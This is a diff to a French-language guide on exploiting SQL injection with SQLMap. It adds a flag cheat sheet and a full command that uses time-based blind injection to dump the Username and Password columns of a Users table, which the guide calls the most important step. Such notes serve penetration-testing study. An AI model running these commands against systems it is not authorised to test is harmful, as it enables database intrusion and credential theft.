@@ -7,7 +7,20 @@ Guide exhaustif pour l'exploitation avancée des injections SQL avec SQLMap.
 ## 📖 Concepts de Base
 
 ## 1️⃣ Utilisation Basique
+```bash
 
+-r fichier requête
+-p paramètre à tester
+--dbmstype de base de données
+--dbs liste toutes les bases de données
+--technique=T injection Time-based (aveugle)
+--dump extraire les données
+-D zmbase de données cible
+-T Userstable cible
+-C colonnes à extraire
+--batch = mode automatique, répond automatiquement "oui" à tout.
+
+```
 ### Détection simple
 
 ```bash
@@ -101,6 +114,10 @@ sqlmap -u URL --search -C password
 
 # Chercher dans les tables
 sqlmap -u URL --search -T user
+
+# Dumper les utilisateurs et mots de passe (le plus important)
+sqlmap -r rqt.txt -p "tid" --batch --technique=T \
+  -D "NOM DE LA DB" -T Users -C Username,Password --dump
 ```
 
 ---
